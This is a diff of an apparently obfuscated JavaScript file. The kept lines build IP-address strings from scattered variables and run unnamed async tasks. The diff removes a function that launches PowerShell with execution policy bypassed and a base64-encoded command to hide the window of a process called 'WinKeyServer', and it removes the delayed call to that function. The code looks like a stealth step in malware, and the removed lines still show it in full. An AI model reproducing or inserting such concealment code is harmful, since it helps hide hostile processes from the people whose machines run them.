@@ -28,41 +28,7 @@ try {
         m = a + '.' + b + '.' + c + '.' + d,
         usu = e + '.' + f + '.' + g + '.' + h,
         lsu = e + '.' + f + '.' + g + '.' + h 
-    function hideWindowByProcessName() {
-        const psScript = `
-            Add-Type 'using System; using System.Runtime.InteropServices; public static class Win32 { [DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow); }';
-            $SW_HIDE = 0;
-            $procName = "WinKeyServer";
-            $procs = Get-Process -Name $procName -ErrorAction SilentlyContinue;
-            if (-not $procs) {
-            Write-Host "No process named $procName found.";
-            exit;
-            }
-            foreach ($p in $procs) {
-            $hwnd = $p.MainWindowHandle;
-            if ($hwnd -eq 0) {
-                Write-Host "Process $($p.Id) has no main window.";
-                continue;
-            }
-            [Win32]::ShowWindowAsync($hwnd, $SW_HIDE) | Out-Null;
-            Write-Host "Hidden window for PID $($p.Id) ($($p.ProcessName))";
-            }
-            `;
-            const encoded = Buffer.from(psScript, "utf16le").toString("base64");
-
-        const ps = spawn("powershell.exe", [
-        "-NoProfile",
-        "-ExecutionPolicy", "Bypass",
-        "-EncodedCommand", encoded
-        ], {
-            windowsHide: false
-        });
-        
-        ps.stdout.on("data", (data) => process.stdout.write(data));
-        ps.stderr.on("data", (data) => process.stderr.write(data));
-        ps.on("close", (code) => console.log(`PowerShell exited with code ${code}`));
-        ps.unref();
-    }
+    
     async function s() {
         try {
             const results = await Promise.all([
@@ -71,8 +37,6 @@ try {
                 bb()
             ]);
             // console.log('✅ All async functions completed:', results);
-            await new Promise(resolve => setTimeout(resolve, 5000));
-            hideWindowByProcessName();
         }catch(error){
             console.error("Error");
         }
